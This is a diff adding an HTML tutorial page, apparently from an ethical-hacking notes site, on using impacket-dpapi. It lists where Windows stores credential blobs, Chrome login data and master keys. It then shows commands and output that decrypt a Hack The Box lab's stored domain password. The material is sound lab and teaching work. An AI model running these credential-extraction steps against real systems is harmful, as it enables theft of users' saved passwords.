@@ -1,0 +1,61 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is <code>impacket-dpapi</code>?</h1>
+    <p class="common">DPAPI, or Data Protection API, is a Windows component that allows developers to encrypt and decrypt sensitive data by using a key derived from a user's password or the system's domain credentials. </p>
+    <p class="common">We can decrypt them with <code>impacket-dpapi</code>.</p>
+
+    <h1>Location for <u class="blue">DPAPI Blob</u></h1>
+    <h2 class="blue">Type I</h2>
+    <p class="common"><code>C:\Users\User\appdata\Roaming\Microsoft\Credentials</code></p>
+
+    <h2 class="blue">Type II</h2>
+    <p class="common"><code>C:\Users\user\AppData\Local\Google\Chrome\User Data\Local State</code></p>
+    <p class="common"><code>C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data</code></p>
+
+    <h2 class="blue">Type III : Wifi Profile</h2>
+    <p class="common"><code>C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\*.xml</code></p>
+
+    <h1>Location for <u class="blue">Masterkey</u></h1>
+    <p class="common"><code>C:\Users\User\appdata\Roaming\Microsoft\protect\SID\</code></p>
+
+    <h1>Usage</h1>
+    <div class="code-box"><pre><code><u class="blue">impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'</u>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
+Flags       :        0 (0)
+Policy      : 4ccf1275 (1288639093)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</code></pre></div>
+
+
+<div class="code-box"><pre><code><u class="blue">impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</u>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-03-08 15:54:29+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=PUPPY.HTB
+Description : 
+Unknown     : 
+Username    : steph.cooper_adm
+Unknown     : FivethChipOnItsWay2025!</code></pre></div>
+</body>
+</html>
